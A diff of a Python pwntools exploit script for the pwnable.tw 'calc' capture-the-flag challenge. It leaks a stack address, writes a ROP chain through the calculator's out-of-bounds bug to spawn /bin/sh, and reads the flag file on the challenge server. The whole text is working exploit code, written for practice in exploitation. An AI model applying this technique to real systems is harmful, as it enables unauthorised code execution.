@@ -1,21 +1,19 @@
 from pwn import *
 
-addrs = ['+361', '+362', '+363', '+364',
-         '+365', '+366', '+367', '+368',
-         '+369', '+370', '+405', '+406']
+addrs = ['+361', '+362', '+363', '+364', 
+         '+365', '+366', '+367', '+368', '+369']
 
-payloads = [0x080550d0, 0x080701d1, 0x00000000, 0x00000000,
-            0x080908d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
-            0x0807cb7f, 0x08049a21, 0x6e69622f, 0x0068732f]
+payloads = [0x0805c34b, 0x0000000b, 0x080701d0, 0x00000000, 
+            0x00000000, 0x00000000, 0x08049a21, 0x6e69622f, 0x0068732f]
 
-def pokestack(s):
-    s.recv(1024)
-    s.send('+364\n')
-    binsh = int(s.recv(1024))
-    payloads[3] = binsh         # dynamically update addr of /bin/sh
+def leak_stack(p):
+    p.recv(1024)
+    p.send('+360\n')
+    prev_ebp = int(p.recv(1024))
+    payloads[5] = prev_ebp         # dynamically update addr of /bin/sh
 
 def rop(s):
-    for i in range(12):
+    for i in range(len(payloads)):
         print '[!] target: %s' % hex(payloads[i])
         s.send(addrs[i]+'\n')
         mleak = int(s.recv(1024))
@@ -28,8 +26,12 @@ def rop(s):
         print '==> %s\n=================' % hex(int(s.recv(1024)))
     s.send('\n')
 
+
 p = remote('chall.pwnable.tw', 10100)
-pokestack(p)
+leak_stack(p)
 rop(p)
-p.sendline('cat /home/calc/flag')
-p.interactive()
+
+p.send('\n')
+p.send('cat /home/calc/flag\n')
+print p.recv(1024)
+p.close()
